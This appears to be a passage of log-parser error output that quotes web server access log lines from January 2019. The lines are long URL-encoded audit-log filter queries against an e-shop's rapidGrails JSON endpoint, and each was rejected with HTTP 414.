      "Error: Line does not match regex pattern: 151.239.241.163 - - [23/Jan/2019:09:31:08 +0330] \"GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:28790},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[60828,%2060829,%2061106]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[57679,%2058602,%2062570]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[987106,%20987121,%20992487,%201034825,%201043822,%201043964,%201050125,%201058377,%201059103,%201065069,%201069943,%201071346,%201077679,%201080951,%201081548,%201081592,%201085226,%201090300,%201090638,%201090765,%201090829,%201096423,%201098133,%201098263,%201098306,%201098365,%201098677,%201098896,%201098936,%201101429,%201103340,%201103766,%201124747,%201129667,%201138598,%201139716,%201151604,%201157578,%201173836,%201177646,%201177724,%201177802,%201177880,%201177958,%201184023,%201184100,%201184177,%201184254,%201185435,%201186836,%201188122,%201188190,%201188289,%201188356,%201188580,%201188646,%201188714,%201188779,%201188846,%201188910,%201188974,%201189040,%201189103,%201189168,%201189230,%201189294,%201189355,%201189418,%201189478,%201189540,%201189599,%201189660,%201189718,%201189776,%201189836,%201189893,%201189952,%201190008,%201190066,%201190121,%201190178,%201190234,%201190287,%201190605,%201190657,%201190710,%201190761,%201193820,%201194310,%201194382,%201195748,%201195816,%201197112,%201197190,%201199572,%201199677,%201201148,%201205466,%201205607,%201209126,%201212283,%201216427,%201217612,%201220301,%201227114,%201227566,%201227647,%201230545,%201230625,%201230705,%201231883,%201232726,%201235726,%201239597,%201244186,%201250215,%201253250,%201255769,%201258720,%201261082,%201269482,%201271604,%201281340,%201281957,%201281965,%201284378,%201284386,%201285873,%201297334,%201297427,%201297489,%201297577,%201300614,%201301456,%201305437,%201314325,%201319335,%201325872,%201336661,%201336680,%201337864,%201338817,%201354442,%201366685,%201367179,%201395027,%201395660,%201421565,%201432684,%201451797,%201470884,%201471379,%201496577,%201529070,%201539470,%201548769,%201556973,%201557020,%201566841,%201579049,%201592648,%201593169,%201593325,%201595980,%201597681,%201601112,%201601149,%201602202,%201610910,%201628256,%201645571,%201652851,%201664619,%201675378,%201688189,%201696659,%201697024,%201707067,%201709359,%201713472,%201728294,%201728702,%201735762,%201736761,%201736937,%201738206,%201738393,%201738396,%201738399,%201738403,%201742639,%201744324,%201744364,%201750336,%201750790,%201755206,%201763498,%201780188,%201786013,%201795468,%201797424,%201800533,%201800910,%201802304,%201802469,%201809758,%201821471,%201824569,%201824643,%201824852,%201824934,%201825015,%201825157,%201825619,%201825706,%201826386,%201826489,%201826591,%201826819,%201826922,%201827124,%201828346,%201829560,%201829784,%201829942,%201831483,%201831589,%201831694,%201831800,%201831905,%201832010,%201832116,%201832283,%201832663,%201832664,%201833024,%201833131,%201833132,%201833240,%201835488,%201836063,%201836231,%201836341,%201836493,%201837002,%201837175,%201837286,%201837287,%201837398,%201837399,%201837725,%201838724,%201842685,%201844939,%201849743,%201853086,%201853413,%201856027,%201857897,%201865492,%201873202,%201884294,%201897795,%201897832,%201899561,%201901452,%201907619,%201908878,%201908938,%201908998,%201909060,%201911987,%201912031,%201912955,%201915059,%201919815,%201930846,%201931495,%201931563,%201933015,%201937676,%201942542,%201953747,%201960558,%201960739,%201965157,%201031381,%201034826,%201043823,%201043965,%201050126,%201058378,%201059104,%201065070,%201069944,%201070655,%201071347,%201077680,%201080952,%201081549,%201081593,%201085227,%201090301,%201092161,%201092284,%201098366,%201101430,%201124748,%201129668,%201138599,%201139717,%201151605,%201157579,%201186837,%201191838,%201195750,%201195818,%201197113,%201197191,%201199573,%201199678,%201201149,%201205467,%201205608,%201209127,%201212284,%201216428,%201217613,%201220302,%201227115,%201227567,%201227648,%201230546,%201230626,%201230706,%201231884,%201232727,%201235727,%201239598,%201244187,%201250216,%201253251,%201255770,%201258721,%201261083,%201269483,%201271605,%201281958,%201281966,%201284379,%201284387,%201285874,%201286328,%201297335,%201297428,%201297490,%201297578,%201300615,%201301457,%201305438,%201314326,%201325873,%201334356,%201334493,%201334727,%201337865,%201340881,%201354443,%201366687,%201367181,%201395029,%201395662,%201421567,%201432686,%201451799,%201470886,%201471381,%201496579,%201529072,%201539472,%201548771,%201556975,%201557022,%201566843,%201579051,%201595982,%201597683,%201601114,%201601151,%201602204,%201610912,%201628258,%201645573,%201652853,%201664621,%201675380,%201688191,%201709363,%201713474,%201763500,%201780190,%201786017,%201797426,%201802306,%201809760,%201849745,%201853088,%201857899,%201865494,%201873204,%201884296,%201901454,%201907621,%201919817,%201931657,%201932158,%201955188,%201965159,%201282274,%201285875,%201297336,%201297429,%201297492,%201297579,%201300616,%201301458,%201305439,%201314327,%201336662,%201336706,%201337866,%201338818,%201350826,%201354444,%201366689,%201367183,%201395031,%201395664,%201421569,%201432688,%201451801,%201470888,%201471383,%201496581,%201529074,%201539474,%201548773,%201556977,%201557024,%201566845,%201579053,%201592650,%201593173,%201593329,%201595984,%201597685,%201601116,%201601153,%201602206,%201610914,%201628260,%201645575,%201652855,%201664623,%201675382,%201688193,%201709365,%201713476,%201744326,%201744366,%201746850,%201746867,%201746884,%201755658,%201759624,%201763502,%201780192,%201786019,%201802308,%201809762,%201821473,%201833376,%201838726,%201842687,%201844941,%201849747,%201853090,%201857901,%201866924,%201897797,%201897834,%201901603,%201901682,%201901762,%201901\" 414 186 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 5.117.116.238 - - [23/Jan/2019:09:31:13 +0330] \"GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:247},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[655]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[1647,%2058783]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[20267,%2028028,%2032913,%2050600,%2060018,%2075651,%2097600,%20104145,%20116307,%20119634,%20120021,%20121368,%20133668,%20171205,%20184500,%20211667,%20231402,%20239281,%20243773,%20293998,%20307392,%20311228,%20324795,%20349049,%20361268,%20363747,%20381586,%20435380,%20435662,%20437128,%20437444,%20437726,%20461117,%20478700,%20568838,%20596275,%20636543,%20693203,%20695024,%20781375,%20782140,%201052862,%201056338,%201060138,%201060297,%201062813,%201063084,%201065201,%201065223,%201067894,%201070052,%201070751,%201074717,%201077799,%201081773,%201082094,%201082120,%201082146,%201083853,%201083880,%201090330,%201090849,%201091808,%201091868,%201091891,%201097260,%201098059,%201098084,%201099081,%201099455,%201101088,%201102656,%201103360,%201103796,%201103974,%201104076,%201104146,%201104179,%201104674,%201105288,%201109520,%201111611,%201118768,%201122867,%201124485,%201129387,%201132112,%201135981,%201135990,%201141252,%201141681,%201152585,%201157244,%201185071,%201186076,%201192363,%201196827,%201196838,%201198371,%201198475,%201201615,%201202495,%201205934,%201211527,%201211874,%201213091,%201216191,%201218903,%201219263,%201221659,%201226667,%201231955,%201236694,%201248311,%201255181,%201269633,%201272922,%201281074,%201281437,%201285407,%201286956,%201290806,%201293056,%201299222,%201305782,%201309655,%201324754,%201325222,%201336319,%201336640,%201339820,%201340973,%201355115,%201355411,%201358787,%201359282,%201373205,%201373845,%201374319,%201380112,%201391226,%201401012,%201401445,%201404173,%201404174,%201407035,%201407036,%201407123,%201407124,%201407210,%201407294,%201407377,%201407455,%201422790,%201423677,%201424244,%201424812,%201425380,%201425813,%201427651,%201428146,%201428566,%201429000,%201452356,%201452780,%201457257,%201457398,%201457998,%201478279,%201509674,%201512033,%201515807,%201531480,%201541488,%201550470,%201550907,%201551595,%201551672,%201551963,%201566195,%201567129,%201577808,%201591994,%201610269,%201612040,%201615378,%201615419,%201619857,%201633768,%201653187,%201658274,%201658280,%201658283,%201662737,%201679910,%201679957,%201681939,%201686637,%201701176,%201713106,%201746894,%201755738,%201762457,%201763068,%201771420,%201779494,%201785207,%201792944,%201797260,%201797268,%201797348,%201799197,%201802624,%201804453,%201806902,%201812068,%201816857,%201830995,%201835850,%201842395,%201848154,%201851428,%201851674,%201856366,%201856700,%201862895,%201862994,%201863208,%201864546,%201867539,%201870489,%201870684,%201873018,%201882018,%201883315,%201885948,%201892480,%201892542,%201893650,%201893674,%201894577,%201894979,%201896734,%201896785,%201896842,%201903467,%201904569,%201904984,%201905159,%201905830,%201906126,%201906545,%201907453,%201907703,%201907736,%201907769,%201907808,%201910720,%201912073,%201916623,%201916776,%201917055,%201920034,%201920722,%201922613,%201922770,%201922771,%201922951,%201928655,%201931006,%201933405,%201934199,%201934206,%201934252,%201935012,%201935133,%201939151,%201940659,%201940777,%201942212,%201942270,%201949122,%201949552,%201949982,%201954484,%201957983,%201958159,%201964281,%201966531,%201972728,%201052863,%201056339,%201060139,%201060298,%201062814,%201063085,%201065202,%201065224,%201067895,%201070053,%201070752,%201074718,%201077800,%201081774,%201082095,%201082121,%201082147,%201083854,%201083881,%201090331,%201090850,%201091809,%201091869,%201091892,%201097261,%201098060,%201098085,%201099082,%201099456,%201101089,%201102657,%201103361,%201103797,%201104077,%201104147,%201104180,%201104675,%201105289,%201109521,%201111612,%201118769,%201122868,%201124486,%201129388,%201132113,%201135982,%201135991,%201141253,%201141682,%201152586,%201157245,%201185072,%201186077,%201192364,%201202496,%201205935,%201211528,%201211875,%201213092,%201216192,%201218904,%201219264,%201221660,%201226668,%201231956,%201236695,%201248312,%201255182,%201269634,%201272923,%201281075,%201281438,%201285408,%201286957,%201290807,%201293057,%201299223,%201305783,%201309656,%201325223,%201336320,%201336325,%201339821,%201339832,%201355116,%201355412,%201358788,%201359283,%201373207,%201373847,%201374321,%201380114,%201391228,%201401014,%201401447,%201404175,%201404176,%201407037,%201407038,%201407125,%201407126,%201407212,%201407296,%201407379,%201407457,%201422792,%201423679,%201424246,%201424814,%201425382,%201425815,%201427653,%201428148,%201428568,%201429002,%201452358,%201452782,%201457259,%201457400,%201458000,%201478281,%201531482,%201541490,%201550472,%201550909,%201551597,%201551674,%201551967,%201566197,%201567131,%201577810,%201591996,%201610271,%201612042,%201615380,%201615421,%201619859,%201633770,%201653189,%201658276,%201658282,%201658285,%201662739,%201679912,%201679959,%201681941,%201686649,%201701178,%201713108,%201746896,%201755740,%201762459,%201763072,%201771422,%201779496,%201785213,%201792946,%201797262,%201797270,%201797350,%201799199,%201802626,%201804455,%201806904,%201812070,%201816859,%201830997,%201835852,%201842397,%201848156,%201851430,%201851676,%201856368,%201856702,%201862897,%201862996,%201863210,%201864548,%201867541,%201870491,%201870686,%201873020,%201882020,%201883317,%201885950,%201892482,%201892544,%201893652,%201893680,%201894579,%201894981,%201896736,%201896787,%201896844,%201903469,%201904571,%201904986,%201905161,%201905832,%201906128,%201906547,%201907455,%201907705,%201907738,%201907771,%201907810,%201910722,%201912075,%201916625,%201916778,%201917057,%201920\" 414 186 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 5.117.116.238 - - [23/Jan/2019:09:35:55 +0330] \"GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:247},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[655]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[1647,%2058783]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[20267,%2028028,%2032913,%2050600,%2060018,%2075651,%2097600,%20104145,%20116307,%20119634,%20120021,%20121368,%20133668,%20171205,%20184500,%20211667,%20231402,%20239281,%20243773,%20293998,%20307392,%20311228,%20324795,%20349049,%20361268,%20363747,%20381586,%20435380,%20435662,%20437128,%20437444,%20437726,%20461117,%20478700,%20568838,%20596275,%20636543,%20693203,%20695024,%20781375,%20782140,%201052862,%201056338,%201060138,%201060297,%201062813,%201063084,%201065201,%201065223,%201067894,%201070052,%201070751,%201074717,%201077799,%201081773,%201082094,%201082120,%201082146,%201083853,%201083880,%201090330,%201090849,%201091808,%201091868,%201091891,%201097260,%201098059,%201098084,%201099081,%201099455,%201101088,%201102656,%201103360,%201103796,%201103974,%201104076,%201104146,%201104179,%201104674,%201105288,%201109520,%201111611,%201118768,%201122867,%201124485,%201129387,%201132112,%201135981,%201135990,%201141252,%201141681,%201152585,%201157244,%201185071,%201186076,%201192363,%201196827,%201196838,%201198371,%201198475,%201201615,%201202495,%201205934,%201211527,%201211874,%201213091,%201216191,%201218903,%201219263,%201221659,%201226667,%201231955,%201236694,%201248311,%201255181,%201269633,%201272922,%201281074,%201281437,%201285407,%201286956,%201290806,%201293056,%201299222,%201305782,%201309655,%201324754,%201325222,%201336319,%201336640,%201339820,%201340973,%201355115,%201355411,%201358787,%201359282,%201373205,%201373845,%201374319,%201380112,%201391226,%201401012,%201401445,%201404173,%201404174,%201407035,%201407036,%201407123,%201407124,%201407210,%201407294,%201407377,%201407455,%201422790,%201423677,%201424244,%201424812,%201425380,%201425813,%201427651,%201428146,%201428566,%201429000,%201452356,%201452780,%201457257,%201457398,%201457998,%201478279,%201509674,%201512033,%201515807,%201531480,%201541488,%201550470,%201550907,%201551595,%201551672,%201551963,%201566195,%201567129,%201577808,%201591994,%201610269,%201612040,%201615378,%201615419,%201619857,%201633768,%201653187,%201658274,%201658280,%201658283,%201662737,%201679910,%201679957,%201681939,%201686637,%201701176,%201713106,%201746894,%201755738,%201762457,%201763068,%201771420,%201779494,%201785207,%201792944,%201797260,%201797268,%201797348,%201799197,%201802624,%201804453,%201806902,%201812068,%201816857,%201830995,%201835850,%201842395,%201848154,%201851428,%201851674,%201856366,%201856700,%201862895,%201862994,%201863208,%201864546,%201867539,%201870489,%201870684,%201873018,%201882018,%201883315,%201885948,%201892480,%201892542,%201893650,%201893674,%201894577,%201894979,%201896734,%201896785,%201896842,%201903467,%201904569,%201904984,%201905159,%201905830,%201906126,%201906545,%201907453,%201907703,%201907736,%201907769,%201907808,%201910720,%201912073,%201916623,%201916776,%201917055,%201920034,%201920722,%201922613,%201922770,%201922771,%201922951,%201928655,%201931006,%201933405,%201934199,%201934206,%201934252,%201935012,%201935133,%201939151,%201940659,%201940777,%201942212,%201942270,%201949122,%201949552,%201949982,%201954484,%201957983,%201958159,%201964281,%201966531,%201972728,%201052863,%201056339,%201060139,%201060298,%201062814,%201063085,%201065202,%201065224,%201067895,%201070053,%201070752,%201074718,%201077800,%201081774,%201082095,%201082121,%201082147,%201083854,%201083881,%201090331,%201090850,%201091809,%201091869,%201091892,%201097261,%201098060,%201098085,%201099082,%201099456,%201101089,%201102657,%201103361,%201103797,%201104077,%201104147,%201104180,%201104675,%201105289,%201109521,%201111612,%201118769,%201122868,%201124486,%201129388,%201132113,%201135982,%201135991,%201141253,%201141682,%201152586,%201157245,%201185072,%201186077,%201192364,%201202496,%201205935,%201211528,%201211875,%201213092,%201216192,%201218904,%201219264,%201221660,%201226668,%201231956,%201236695,%201248312,%201255182,%201269634,%201272923,%201281075,%201281438,%201285408,%201286957,%201290807,%201293057,%201299223,%201305783,%201309656,%201325223,%201336320,%201336325,%201339821,%201339832,%201355116,%201355412,%201358788,%201359283,%201373207,%201373847,%201374321,%201380114,%201391228,%201401014,%201401447,%201404175,%201404176,%201407037,%201407038,%201407125,%201407126,%201407212,%201407296,%201407379,%201407457,%201422792,%201423679,%201424246,%201424814,%201425382,%201425815,%201427653,%201428148,%201428568,%201429002,%201452358,%201452782,%201457259,%201457400,%201458000,%201478281,%201531482,%201541490,%201550472,%201550909,%201551597,%201551674,%201551967,%201566197,%201567131,%201577810,%201591996,%201610271,%201612042,%201615380,%201615421,%201619859,%201633770,%201653189,%201658276,%201658282,%201658285,%201662739,%201679912,%201679959,%201681941,%201686649,%201701178,%201713108,%201746896,%201755740,%201762459,%201763072,%201771422,%201779496,%201785213,%201792946,%201797262,%201797270,%201797350,%201799199,%201802626,%201804455,%201806904,%201812070,%201816859,%201830997,%201835852,%201842397,%201848156,%201851430,%201851676,%201856368,%201856702,%201862897,%201862996,%201863210,%201864548,%201867541,%201870491,%201870686,%201873020,%201882020,%201883317,%201885950,%201892482,%201892544,%201893652,%201893680,%201894579,%201894981,%201896736,%201896787,%201896844,%201903469,%201904571,%201904986,%201905161,%201905832,%201906128,%201906547,%201907455,%201907705,%201907738,%201907771,%201907810,%201910722,%201912075,%201916625,%201916778,%201917057,%201920\" 414 186 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 5.117.116.238 - - [23/Jan/2019:09:36:19 +0330] \"GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:247},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[655]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[1647,%2058783]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[20267,%2028028,%2032913,%2050600,%2060018,%2075651,%2097600,%20104145,%20116307,%20119634,%20120021,%20121368,%20133668,%20171205,%20184500,%20211667,%20231402,%20239281,%20243773,%20293998,%20307392,%20311228,%20324795,%20349049,%20361268,%20363747,%20381586,%20435380,%20435662,%20437128,%20437444,%20437726,%20461117,%20478700,%20568838,%20596275,%20636543,%20693203,%20695024,%20781375,%20782140,%201052862,%201056338,%201060138,%201060297,%201062813,%201063084,%201065201,%201065223,%201067894,%201070052,%201070751,%201074717,%201077799,%201081773,%201082094,%201082120,%201082146,%201083853,%201083880,%201090330,%201090849,%201091808,%201091868,%201091891,%201097260,%201098059,%201098084,%201099081,%201099455,%201101088,%201102656,%201103360,%201103796,%201103974,%201104076,%201104146,%201104179,%201104674,%201105288,%201109520,%201111611,%201118768,%201122867,%201124485,%201129387,%201132112,%201135981,%201135990,%201141252,%201141681,%201152585,%201157244,%201185071,%201186076,%201192363,%201196827,%201196838,%2011983